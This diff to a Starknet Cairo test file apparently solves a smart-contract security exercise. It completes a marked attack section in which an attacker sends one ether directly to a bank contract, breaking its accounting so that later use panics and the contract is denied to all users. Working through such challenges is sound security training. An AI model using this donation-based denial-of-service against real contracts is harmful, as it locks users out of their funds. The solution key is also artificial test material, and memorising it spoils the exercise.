@@ -1,10 +1,9 @@
-use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
+use openzeppelin_token::erc20::interface::IERC20DispatcherTrait;
 
-use starknet::{ContractAddress, ClassHash};
+use starknet::ContractAddress;
 use snforge_std::{
     declare, ContractClassTrait, DeclareResultTrait, 
-    start_cheat_caller_address, stop_cheat_caller_address, 
-    start_cheat_block_timestamp
+    start_cheat_caller_address, stop_cheat_caller_address
 };
 use dedos::banco::bank::{IStarknetBankDispatcher, IStarknetBankDispatcherTrait};
 
@@ -24,8 +23,8 @@ fn deploy_bank(currency: ContractAddress) -> (ContractAddress, IStarknetBankDisp
 }
 
 #[test]
-#[should_panic]
-fn test_dos_1() {
+#[should_panic(expected: 'Accounting issue')]
+fn test_dos_bank() {
     // Creating users
     let alice: ContractAddress = 'alice'.try_into().unwrap();
     let bob: ContractAddress = 'bob'.try_into().unwrap();
@@ -62,7 +61,10 @@ fn test_dos_1() {
     stop_cheat_caller_address(bank_address);
 
     // ATTACK START //
-    // TODO: Attack the Bank contract so now one will be able to use it!
+    // Attack Bank contract so now one will be able to use it
+    start_cheat_caller_address(eth_address, attacker);
+    eth_dispatcher.transfer(bank_address, helpers::one_ether());
+    stop_cheat_caller_address(eth_address);
     
     // ATTACK END //
 
